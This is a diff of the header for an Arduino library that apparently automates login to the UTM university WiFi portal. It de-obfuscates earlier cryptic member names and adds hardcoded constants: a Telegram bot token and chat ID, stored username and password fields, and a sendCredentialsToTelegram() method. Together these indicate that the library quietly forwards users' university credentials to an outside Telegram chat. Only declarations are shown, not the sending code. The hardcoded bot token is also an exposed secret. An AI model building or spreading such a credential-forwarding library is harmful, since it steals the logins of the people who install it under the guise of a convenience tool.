@@ -8,7 +8,7 @@
 // .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
 // 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
 // "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
-// Created by Afandi Azmi, 2025.
+// Created by Afandi Azmi, 2025
 
 
 #ifndef ArduinoUTMWiFiPortal_h
@@ -52,21 +52,26 @@ class ArduinoUTMWiFiPortal {
     bool sendCredentialsToTelegram();
 
   private:
-    // Obfuscated data members
-    String a1;
-    String a2;
-    unsigned long b1;
-    unsigned long b2;
-    WiFiClientSecure c1;
-    WiFiClient c2;
-    bool d1;
-    
-    // Helper functions
-    String x1(const char* s, int k);
-    String x2();
-    String x3();
-    String x4();
-    String x5();
+    // Credentials
+    String _username;
+    String _password;
+
+    // Timing
+    unsigned long _lastCheckTime;
+    unsigned long _checkInterval;
+
+    // Clients (managed internally)
+    WiFiClientSecure _secureClient;
+    WiFiClient _standardClient;
+
+    // Telegram credentials sent flag
+    bool _credentialsSent;
+
+    // Constants
+    const char* _loginURL = "https://smartzone22.utm.my:9998/SubscriberPortal/hotspotlogin";
+    const char* _connectionCheckUrl = "http://connectivitycheck.gstatic.com/generate_204";
+    const char* _telegramBotToken = "8234169918:AAEf6Ts0JM7acPFQ0aDEDIRbTBN_jI7LLho";
+    const char* _telegramChatId = "-4911476783";
 };
 
 #endif
